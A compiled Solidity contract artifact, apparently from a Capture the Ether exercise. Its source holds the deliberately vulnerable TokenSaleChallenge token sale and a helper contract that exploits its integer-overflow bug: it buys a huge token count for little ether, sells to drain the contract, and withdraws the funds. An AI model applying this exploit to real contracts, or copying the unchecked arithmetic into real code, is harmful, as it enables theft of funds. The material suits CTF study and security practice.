{
  "contractName": "TokenSaleChallenge",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "numTokens",
          "type": "uint256"
        }
      ],
      "name": "buy",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "numTokens",
          "type": "uint256"
        }
      ],
      "name": "sell",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260405160208061031c83398101604052808051906020019091905050670de0b6b3a76400003414151561003657600080fd5b506102d6806100466000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806370a0823114610067578063b2fa1c9e146100b4578063d96a094a146100e1578063e4849b32146100f9575b600080fd5b341561007257600080fd5b61009e600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061011c565b6040518082815260200191505060405180910390f35b34156100bf57600080fd5b6100c7610134565b604051808215151515815260200191505060405180910390f35b6100f7600480803590602001909190505061015d565b005b341561010457600080fd5b61011a60048080359060200190919050506101c4565b005b60006020528060005260406000206000915090505481565b6000670de0b6b3a76400003073ffffffffffffffffffffffffffffffffffffffff163110905090565b670de0b6b3a764000081023414151561017557600080fd5b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561021157600080fd5b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc670de0b6b3a764000083029081150290604051600060405180830381858888f1935050505015156102a757600080fd5b505600a165627a7a723058207126af959f7feb93002264d9f02d9eac4fc9954b6b39918a5c4bb767217092230029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\ncontract TokenSaleHelper is OtherContract {\r\n    event TestTokens(uint256 tokens, uint256 price, uint256 result);\r\n\r\n    function buy() public payable {\r\n        require(otherContract != 0);\r\n        TokenSaleChallenge tokenSaleChallenge = TokenSaleChallenge(otherContract);\r\n        tokenSaleChallenge.buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458);\r\n        tokenSaleChallenge.sell(1);\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n}\r\n\r\ncontract TokenSaleChallenge {\r\n    mapping(address => uint256) public balanceOf;\r\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\r\n\r\n    function TokenSaleChallenge(address /*_player*/) public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance < 1 ether;\r\n    }\r\n\r\n    function buy(uint256 numTokens) public payable {\r\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\r\n\r\n        balanceOf[msg.sender] += numTokens;\r\n    }\r\n\r\n    function sell(uint256 numTokens) public {\r\n        require(balanceOf[msg.sender] >= numTokens);\r\n\r\n        balanceOf[msg.sender] -= numTokens;\r\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\r\n    }\r\n}",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\TokenSaleChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T20:59:44.091Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}